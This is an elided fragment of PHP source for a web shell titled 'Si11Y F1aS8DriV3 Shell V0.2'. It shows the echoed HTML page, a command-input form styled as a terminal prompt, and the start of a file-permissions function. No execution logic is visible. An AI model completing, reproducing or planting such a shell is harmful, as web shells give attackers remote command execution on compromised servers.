...
<html>
<head>
<title>Si11Y F1aS8DriV3 Web Shell</title>
</head>';
?>
...
echo '</head>
<body><b>
<p>Si11Y F1aS8DriV3<font color="white">Shell</p></font>
...
<form><font color="white">
    <label for="cmd">Si11Y F1aS8DriV3@localhost:~$ </label>
...
echo '<br><center><h4>Si11Y F1aS8DriV3 Shell V0.2</h4></b></body>
</html>';
function perms($file){
